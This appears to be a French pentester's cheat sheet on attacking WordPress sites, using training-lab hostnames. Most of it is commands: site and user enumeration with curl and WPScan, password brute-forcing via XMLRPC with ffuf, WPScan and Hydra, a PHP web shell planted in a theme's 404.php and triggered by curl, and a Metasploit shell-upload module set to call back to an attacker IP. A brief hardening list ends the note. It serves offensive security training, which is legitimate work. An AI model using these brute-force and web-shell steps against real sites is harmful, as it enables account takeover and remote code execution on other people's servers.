
- [ ] [[#ENUMERATION MANUELLE]]
- [ ] [[#ENUMERATION WPSCAN]]
- [ ] [[#EXPLOITATION]]
- [ ] [[#HARDENING WORDPRESS]]


# Fichiers / Dossiers Importants

/robots.txt
/sitemap.xml

### License

/license.txt -> version de wordpress utilisée
### Fichier config

/wp-config.php -> identifiants pour communiquer avec la DB
### Admin

/wp-admin/
### Content

/wp-content/
#### Uploads

/wp-content/uploads/
#### Plugins

/wp-content/plugins/
#### Thèmes

/wp-content/themes/



# Roles

| Role          | Description                                                                                                                                            |
| ------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Administrator | This user has access to administrative features within the website. This includes adding and deleting users and posts, as well as editing source code. |
| Editor        | An editor can publish and manage posts, including the posts of other users.                                                                            |
| Author        | Authors can publish and manage their own posts.                                                                                                        |
| Contributor   | These users can write and manage their own posts but cannot publish them.                                                                              |
| Subscriber    | These are normal users who can browse posts and edit their profiles.                                                                                   |


---


# ENUMERATION MANUELLE

- [[#Identifier Wordpress]]
- [[#Version WP]]
- [[#PLUGINS & THEMES]]
- [[#DIRECTORY INDEXING]]
- [[#USER ENUMERATION]]

/robots.txt
/sitemap.xml

## Identifier Wordpress

```bash
curl -s -X GET http://blog.inlanefreight.com | grep WordPress
```

## Version WP

```bash
curl -s -X GET http://blog.inlanefreight.com | grep '<meta name="generator"'
```

```bash
curl -s -X GET http://blog.inlanefreight.com/readme.html
```

Regarder également Code Source CSS et JS.

## PLUGINS & THEMES

(Enumérer sur le plus de pages possibles)

### Plugins

```bash
curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
```

### Themes

```bash
curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2
```

## DIRECTORY INDEXING

Plugins

```bash
curl -s -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta/ | html2text
```

Uploads

```bash
curl -s -X GET http://blog.inlanefreight.com/wp-content/uploads/ | html2text
```


## USER ENUMERATION

Regarder les posts sur le blog pour voir les auteurs.
### Curl

Si 301 redirect -> user existe, si 404 not found, user n'existe pas

```bash
curl -s -I http://blog.inlanefreight.com/?author=1
```

### JSON endpoint (Pre WP 4.7.1)

```bash
curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq
```

### XMLRPC

/xmlrpc.php

Lister les méthodes XMLRPC possibles
```BASH
curl -s -X POST -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
```


---

# ENUMERATION #WPSCAN


Enumération passive

```BASH
wpscan --force update --rua -e ap,at,tt,cb,dbe,u,m --url <URL> --api-token <token> -t 24
```

Enumération agressive

```BASH
wpscan --force update --rua -e ap,at,tt,cb,dbe,u,m --detection-mode aggressive --url <URL> --api-token <token> -t 24
```

Enumération agressive de tous les plugins

```bash
wpscan --force update -e ap --plugins-detection aggressive --detection-mode aggressive --url http://blog.inlanefreight.local/ --api-token <token> -t 24
```


---
# EXPLOITATION

- [ ] [[#Tester Weak credentials / Credential stuffing]]
- [ ] [[#Bruteforce de login]]
- [ ] [[#PLUGIN VULNERABLE]]
- [ ] [[#RCE THEME EDITOR]]
- [ ] [[#AUTOMATISATION AVEC METASPLOIT]]


## Tester Weak credentials / Credential stuffing

admin:admin, admin:password....
### Credential Stuffing (Liste de default creds)

Resources:

https://www.cirt.net/passwords
https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials
https://github.com/scadastrangelove/SCADAPASS/blob/master/scadapass.csv
https://github.com/ihebski/DefaultCreds-cheat-sheet/tree/main



## Bruteforce de login

> [!TIP]
> Faire wordlist avec Cewl

### XMLRPC

POST request avec méthode WP.getUsersBlogs

```bash
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
```

fuzzing avec ffuf (rapide)

```bash
ffuf -w /usr/share/wordlists/rockyou.txt -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>roger</value></param><param><value>FUZZ</value></param></params></methodCall>" -u http://94.237.60.18:37358/xmlrpc.php -fr "Incorrect username or password." -t 64
```

Bruteforce avec WPScan

```bash
wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com
```

### HTTP POST FORM avec Hydra

```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt <ip> -s <port> http-post-form "/wp-login.php:username=^USER^&password=^PASS^:F=Invalid credentials" -I -f -V
```

## PLUGIN VULNERABLE

Chercher CVEs et tester

## RCE THEME EDITOR

Tester RCE avec shell PHP ( Modifier 404.php par exemple)

```php
<?php system($_REQUEST['bb58021f870b5f85c6c24120540de43f']); ?>
```


```bash
curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?bb58021f870b5f85c6c24120540de43f=id"
```

## AUTOMATISATION AVEC METASPLOIT

Dans metasploit

```msfconsole
use exploit/unix/webapp/wp_admin_shell_upload
```

```shell-session
set rhosts blog.inlanefreight.com
```

```shell-session
set username admin
```

```shell-session
set password Winter2020
```

```shell-session
set lhost 10.10.16.8
```

```shell-session
run
```


# HARDENING WORDPRESS

https://developer.wordpress.org/advanced-administration/security/hardening/

- MaJ regulières
- Pas de thèmes / plugins douteux
- Désactiver le compte admin de base
- Politique de mot de passes complexe
- MFA
- Principe de moindre privilèges
- Audit régulier des droits des utilisateurs
- Limiter le nombre de login attempts
- Renommer la page wp-login.php + la déplacer + Filtrer Acces sur IP 
- WAF

- Plugins de sécurité populaires:
	- #### [Sucuri Security](https://wordpress.org/plugins/sucuri-scanner/)

- This plugin is a security suite consisting of the following features:
    - Security Activity Auditing
    - File Integrity Monitoring
    - Remote Malware Scanning
    - Blacklist Monitoring.

#### [iThemes Security](https://wordpress.org/plugins/better-wp-security/)

- iThemes Security provides 30+ ways to secure and protect a WordPress site such as:
    - Two-Factor Authentication (2FA)
    - WordPress Salts & Security Keys
    - Google reCAPTCHA
    - User Action Logging

#### [Wordfence Security](https://wordpress.org/plugins/wordfence/)

- Wordfence Security consists of an endpoint firewall and malware scanner.
    - The WAF identifies and blocks malicious traffic.
    - The premium version provides real-time firewall rule and malware signature updates
    - Premium also enables real-time IP blacklisting to block all requests from known most malicious IPs.


## MaJ régulières -> AutoUpdates

Dans wp-config.php

```php
define( 'WP_AUTO_UPDATE_CORE', true );
```

Code: php

```php
add_filter( 'auto_update_plugin', '__return_true' );
```

Code: php

```php
add_filter( 'auto_update_theme', '__return_true' );
```

